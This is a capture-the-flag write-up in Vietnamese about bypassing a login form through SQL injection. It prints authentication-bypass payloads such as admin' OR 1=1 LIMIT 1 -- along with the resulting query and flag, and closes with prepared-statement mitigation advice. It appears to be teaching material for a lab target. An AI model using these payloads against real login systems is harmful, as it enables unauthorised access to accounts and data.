# Overview

Trong challenge này, chúng ta sẽ khai thác lỗ hổng SQL Injection trong form đăng nhập để bypass authentication và lấy được flag.

## Challenge Description

Target: http://ctf.example.com/login

Nhiệm vụ: Tìm cách đăng nhập vào hệ thống mà không cần username và password hợp lệ.

# Reconnaissance

## Initial Analysis

Đầu tiên, ta thử với một số payload SQL Injection cơ bản:

```
Username: admin' OR '1'='1
Password: anything
```

## Response Analysis

Server trả về thông báo lỗi:

```
Error: You have an error in your SQL syntax
```

Điều này xác nhận rằng input không được sanitize đúng cách và có thể bị SQL Injection.

# Exploitation

## Step 1: Identify the Query Structure

Ta thử payload sau để xác định cấu trúc câu query:

```sql
admin' OR '1'='1' --
```

## Step 2: Bypass Authentication

Sau khi hiểu được cấu trúc, ta sử dụng payload:

```sql
admin' OR 1=1 LIMIT 1 --
```

Câu query cuối cùng sẽ trông như thế này:

```sql
SELECT * FROM users WHERE username='admin' OR 1=1 LIMIT 1 -- ' AND password='anything'
```

## Step 3: Get the Flag

Khi đăng nhập thành công, ta được chuyển đến dashboard và thấy flag:

```
FLAG{SQL_1nj3ct10n_1s_d4ng3r0us}
```

# Conclusion

## Lessons Learned

1. **Input Validation**: Luôn validate và sanitize user input
2. **Prepared Statements**: Sử dụng prepared statements để ngăn chặn SQL Injection
3. **Least Privilege**: Database user không nên có quyền quá cao

## Mitigation

Code an toàn nên sử dụng prepared statements:

```python
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```

## Tools Used

- Burp Suite
- SQLmap
- Browser Developer Tools

# References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
